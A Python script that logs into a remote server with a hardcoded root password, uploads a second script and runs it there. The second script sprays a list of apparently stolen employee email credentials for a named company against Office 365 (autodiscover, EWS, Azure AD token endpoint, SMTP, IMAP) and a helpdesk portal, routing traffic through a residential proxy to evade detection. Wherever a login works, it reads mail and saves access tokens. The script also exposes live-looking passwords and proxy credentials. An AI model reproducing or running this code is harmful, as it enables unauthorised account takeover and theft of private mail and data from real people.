import paramiko, sys

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = r'''
import requests, urllib3, json, sys, time, base64, re, smtplib, imaplib, socket
urllib3.disable_warnings()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

# Bright Data MX Residential proxy (Telmex/UNINET — misma ISP que el stealer 189.157.x)
PROXY_MX = "http://brd-customer-hl_25b43d3c-zone-residential_mx1-country-mx:erjvs0sv8cvs@brd.superproxy.io:22225"
PROXIES = {"http": PROXY_MX, "https": PROXY_MX}

# Verify proxy IP first
sys.stdout.write("=" * 60 + "\n=== PROXY CHECK ===\n" + "=" * 60 + "\n\n")
try:
    r = requests.get("https://httpbin.org/ip", proxies=PROXIES, verify=False, timeout=15)
    my_ip = r.json().get("origin", "?")
    sys.stdout.write(f"  Exit IP: {my_ip}\n")
except Exception as e:
    sys.stdout.write(f"  Proxy check failed: {str(e)[:80]}\n")
    sys.stdout.write(f"  Continuing without proxy for HTTP, SMTP direct from VPS\n")
    PROXIES = {}
sys.stdout.flush()

CREDS = [
    ("jsanchezfern@findep.global", "AFI2022*"),
    ("bemedezar@findep.global", "AFI2022*"),
    ("admin@findep.global", "4dm1n##*2411"),
    ("admin@findep.global", "BcF1s42o2d*"),
    ("mmartinez@findep.global", "Rul76846"),
    ("jeff@findep.global", "AFI2022*"),
    ("jeff@findep.global", "4dm1n##*2411"),
    ("jeff@findep.global", "BcF1s42o2d*"),
    ("jeff@findep.global", "Rul76846"),
]


# ========================================
# 1. OUTLOOK WEB LOGIN (OWA) via proxy MX
# ========================================
sys.stdout.write("\n" + "=" * 60 + "\n=== OUTLOOK WEB LOGIN (ActiveSync autodiscover) ===\n" + "=" * 60 + "\n\n")

for email, pw in CREDS:
    try:
        # Use Basic Auth against Exchange ActiveSync / Autodiscover
        # This is how Outlook mobile authenticates — good signal
        auth_b64 = base64.b64encode(f"{email}:{pw}".encode()).decode()
        
        # Method 1: Autodiscover v2 (modern)
        r = requests.get(
            f"https://outlook.office365.com/autodiscover/autodiscover.json/v1.0/{email}?Protocol=ActiveSync",
            headers={"User-Agent": UA, "Authorization": f"Basic {auth_b64}"},
            proxies=PROXIES, verify=False, timeout=15, allow_redirects=False
        )
        
        tag = ""
        if r.status_code == 200:
            tag = "*** HIT — OUTLOOK ACCESS ***"
            with open(f'/root/outlook_hit_{email.split("@")[0]}.json', 'w') as f:
                f.write(r.text)
        elif r.status_code == 401:
            tag = "401 (bad creds)"
        elif r.status_code == 302:
            location = r.headers.get("Location", "")[:80]
            tag = f"302 → {location}"
        elif r.status_code == 403:
            tag = "403 (blocked/MFA)"
        elif r.status_code == 456:
            tag = "456 (MFA REQUIRED — PW VALID!)"
        else:
            tag = f"{r.status_code}"
        
        sys.stdout.write(f"  [{r.status_code}] {tag} — {email}:{pw}\n")
        
    except Exception as e:
        sys.stdout.write(f"  ERR {email}:{pw} — {str(e)[:60]}\n")
    time.sleep(2)
    sys.stdout.flush()


# ========================================
# 2. EXCHANGE WEB SERVICES (EWS)
# ========================================
sys.stdout.write("\n" + "=" * 60 + "\n=== EWS (Exchange Web Services) ===\n" + "=" * 60 + "\n\n")

for email, pw in CREDS:
    try:
        auth_b64 = base64.b64encode(f"{email}:{pw}".encode()).decode()
        
        # EWS GetFolder — tests mailbox access
        soap = '<?xml version="1.0" encoding="utf-8"?>'
        soap += '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"'
        soap += ' xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types">'
        soap += '<soap:Body><GetFolder xmlns="http://schemas.microsoft.com/exchange/services/2006/messages">'
        soap += '<FolderShape><t:BaseShape>Default</t:BaseShape></FolderShape>'
        soap += '<FolderIds><t:DistinguishedFolderId Id="inbox"/></FolderIds>'
        soap += '</GetFolder></soap:Body></soap:Envelope>'
        
        r = requests.post(
            "https://outlook.office365.com/EWS/Exchange.asmx",
            headers={
                "User-Agent": UA,
                "Authorization": f"Basic {auth_b64}",
                "Content-Type": "text/xml; charset=utf-8"
            },
            data=soap,
            proxies=PROXIES, verify=False, timeout=15
        )
        
        tag = ""
        if r.status_code == 200 and "GetFolderResponse" in r.text:
            tag = "*** HIT — MAILBOX ACCESS ***"
            # Extract inbox info
            count_match = re.search(r'<t:TotalCount>(\d+)</t:TotalCount>', r.text)
            unread_match = re.search(r'<t:UnreadCount>(\d+)</t:UnreadCount>', r.text)
            if count_match:
                tag += f" Total:{count_match.group(1)}"
            if unread_match:
                tag += f" Unread:{unread_match.group(1)}"
            with open(f'/root/ews_hit_{email.split("@")[0]}.xml', 'w') as f:
                f.write(r.text)
        elif r.status_code == 401:
            tag = "401"
        elif r.status_code == 403:
            tag = "403 (blocked/conditional access)"
        elif r.status_code == 456:
            tag = "456 (MFA — PW VALID!)"
        else:
            tag = f"{r.status_code}"
        
        sys.stdout.write(f"  [{r.status_code}] {tag} — {email}:{pw}\n")
        
    except Exception as e:
        sys.stdout.write(f"  ERR {email}:{pw} — {str(e)[:60]}\n")
    time.sleep(2)
    sys.stdout.flush()


# ========================================
# 3. MICROSOFT GRAPH API via ROPC + proxy
# ========================================
sys.stdout.write("\n" + "=" * 60 + "\n=== AZURE AD ROPC (via MX proxy) ===\n" + "=" * 60 + "\n\n")

TENANT = "30fcec21-d05d-4ca6-8233-a90183fc7dbd"
CLIENT_IDS = [
    ("1fec8e78-bce4-4aaf-ab1b-5451cc387264", "Teams"),
    ("d3590ed6-52b3-4102-aeff-aad2292ab01c", "Office"),
]

for email, pw in CREDS:
    for cid, cname in CLIENT_IDS[:1]:
        try:
            r = requests.post(
                f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/token",
                data={
                    "grant_type": "password",
                    "client_id": cid,
                    "username": email,
                    "password": pw,
                    "scope": "https://graph.microsoft.com/.default"
                },
                proxies=PROXIES, verify=False, timeout=15
            )
            
            if r.status_code == 200:
                sys.stdout.write(f"  *** HIT *** {email}:{pw} ({cname})\n")
                td = r.json()
                access = td.get("access_token", "")
                if access:
                    parts = access.split(".")
                    if len(parts) >= 2:
                        payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
                        sys.stdout.write(f"    UPN: {payload.get('upn')}\n")
                        sys.stdout.write(f"    Name: {payload.get('name')}\n")
                        sys.stdout.write(f"    Roles: {payload.get('wids', [])}\n")
                    
                    # Try Graph API — get profile + mail
                    headers = {"Authorization": f"Bearer {access}", "User-Agent": UA}
                    r_me = requests.get("https://graph.microsoft.com/v1.0/me", headers=headers, proxies=PROXIES, verify=False, timeout=10)
                    sys.stdout.write(f"    /me: [{r_me.status_code}] {r_me.text[:200]}\n")
                    
                    r_mail = requests.get("https://graph.microsoft.com/v1.0/me/messages?$top=5&$select=subject,from,receivedDateTime",
                        headers=headers, proxies=PROXIES, verify=False, timeout=10)
                    sys.stdout.write(f"    /mail: [{r_mail.status_code}] {r_mail.text[:300]}\n")
                    
                    with open(f'/root/graph_hit_{email.split("@")[0]}.json', 'w') as f:
                        json.dump({"token": td, "me": r_me.text[:1000], "mail": r_mail.text[:2000]}, f)
            else:
                err = r.json().get("error_description", "?")[:100]
                locked = "50053" in err
                bad_pw = "50126" in err
                not_found = "50034" in err
                mfa = "50076" in err or "50079" in err
                disabled = "50057" in err
                cond_access = "53003" in err or "50158" in err
                
                tag = ""
                if locked: tag = "[LOCKED]"
                elif not_found: tag = "[NOT FOUND]"
                elif bad_pw: tag = "[BAD PW]"
                elif mfa: tag = "[MFA — PW VALID!]"
                elif disabled: tag = "[DISABLED]"
                elif cond_access: tag = "[CONDITIONAL ACCESS — PW VALID!]"
                
                sys.stdout.write(f"  {tag} {email}:{pw} — {err[:80]}\n")
                
                if not_found:
                    break
                if locked:
                    break
        except Exception as e:
            sys.stdout.write(f"  ERR {email}:{pw} — {str(e)[:60]}\n")
        time.sleep(2.5)
        sys.stdout.flush()


# ========================================
# 4. SMTP via SOCKS proxy (Bright Data)
# ========================================
sys.stdout.write("\n" + "=" * 60 + "\n=== SMTP via proxy ===\n" + "=" * 60 + "\n\n")

# SMTP doesn't support HTTP proxy directly, try from VPS IP (already non-residential but not local)
smtp_creds = [
    ("jsanchezfern@findep.global", "AFI2022*"),
    ("bemedezar@findep.global", "AFI2022*"),
    ("mmartinez@findep.global", "Rul76846"),
    ("admin@findep.global", "BcF1s42o2d*"),
    ("jeff@findep.global", "AFI2022*"),
]

for email, pw in smtp_creds:
    try:
        srv = smtplib.SMTP("smtp.office365.com", 587, timeout=10)
        srv.ehlo()
        srv.starttls()
        srv.ehlo()
        srv.login(email, pw)
        sys.stdout.write(f"  *** SMTP HIT *** {email}:{pw}\n")
        srv.quit()
    except smtplib.SMTPAuthenticationError as e:
        code = e.smtp_code
        msg = str(e.smtp_error)[:100]
        tag = ""
        if b"SmtpClientAuthentication is disabled" in e.smtp_error:
            tag = "[SMTP DISABLED for tenant]"
        elif b"Authentication unsuccessful" in e.smtp_error:
            tag = "[BAD CREDS]"
        sys.stdout.write(f"  {tag} {email}:{pw} — {code} {msg}\n")
    except Exception as e:
        sys.stdout.write(f"  ERR {email}:{pw} — {str(e)[:60]}\n")
    time.sleep(2)
    sys.stdout.flush()


# ========================================
# 5. IMAP via VPS
# ========================================
sys.stdout.write("\n" + "=" * 60 + "\n=== IMAP (outlook.office365.com:993) ===\n" + "=" * 60 + "\n\n")

for email, pw in smtp_creds:
    try:
        imap = imaplib.IMAP4_SSL("outlook.office365.com", 993, timeout=10)
        imap.login(email, pw)
        sys.stdout.write(f"  *** IMAP HIT *** {email}:{pw}\n")
        status, mboxes = imap.list()
        sys.stdout.write(f"  Mailboxes: {len(mboxes) if mboxes else 0}\n")
        for mb in (mboxes or [])[:5]:
            sys.stdout.write(f"    {mb.decode(errors='replace')[:80]}\n")
        # Check inbox
        imap.select("INBOX")
        status, msgs = imap.search(None, "ALL")
        msg_ids = msgs[0].split() if msgs[0] else []
        sys.stdout.write(f"  Inbox messages: {len(msg_ids)}\n")
        if msg_ids:
            # Read last 3
            for mid in msg_ids[-3:]:
                status, data = imap.fetch(mid, "(BODY[HEADER.FIELDS (FROM SUBJECT DATE)])")
                if data[0]:
                    sys.stdout.write(f"    {data[0][1].decode(errors='replace')[:200]}\n")
        imap.logout()
    except Exception as e:
        err = str(e)[:100]
        tag = ""
        if "AUTHENTICATE failed" in err:
            tag = "[BAD CREDS]"
        elif "LOGIN is disabled" in err:
            tag = "[IMAP DISABLED]"
        sys.stdout.write(f"  {tag} {email}:{pw} — {err}\n")
    time.sleep(2)
    sys.stdout.flush()


# ========================================
# 6. FootPrints via proxy
# ========================================
sys.stdout.write("\n" + "=" * 60 + "\n=== FOOTPRINTS (via MX proxy) ===\n" + "=" * 60 + "\n\n")

PAO = "https://pao.findep.com.mx"
fp_extra = [
    ("jeff", "AFI2022*"), ("jeff", "BcF1s42o2d*"), ("jeff", "Rul76846"),
    ("jsanchezfern", "AFI2022*"), ("mmartinez", "Rul76846"),
    ("admin", "4dm1n##*2411"), ("admin", "BcF1s42o2d*"),
    ("MRAdmin", "4dm1n##*2411"), ("MRAdmin", "BcF1s42o2d*"),
    ("hgarciaar", "Pao1234+"), ("cguerrave", "Pao1234+"),
    ("mcarrillo", "Pao1234+"), ("jreyes", "Pao1234+"),
]

for user, pw in fp_extra:
    try:
        s = requests.Session()
        s.verify = False
        s.headers.update({"User-Agent": UA})
        s.proxies = PROXIES
        r = s.post(f"{PAO}/MRcgi/MRlogin.pl",
            data={"USER": user, "PASSWORD": pw, "USERID": user,
                  "MRSubmit": "Submit", "PROJECTID": "1", "LASTSTEP": "1"},
            timeout=20, allow_redirects=True)
        
        has_mrp = 'NAME=MRP' in r.text
        has_homepage = 'MRhomepage.pl' in r.text
        has_custuser = 'CUSTUSER' in r.text
        
        if has_mrp and has_homepage:
            role = "CUSTOMER" if has_custuser else "AGENT/ADMIN"
            sys.stdout.write(f"  *** LOGIN OK ({role}) *** {user}:{pw}\n")
        else:
            sys.stdout.write(f"  FAIL {user}:{pw}\n")
    except Exception as e:
        sys.stdout.write(f"  ERR {user}:{pw} — {str(e)[:60]}\n")
    time.sleep(1.5)
    sys.stdout.flush()


sys.stdout.write("\n\n=== ALL DONE ===\n")
sys.stdout.flush()
'''

sftp = ssh.open_sftp()
with sftp.open('/root/fp_outlook_mx.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Uploaded', flush=True)

stdin, stdout, stderr = ssh.exec_command('python3 -u /root/fp_outlook_mx.py 2>&1', timeout=300)
out = stdout.read().decode(errors='replace')
print(out, flush=True)
ssh.close()
print('Fin.', flush=True)
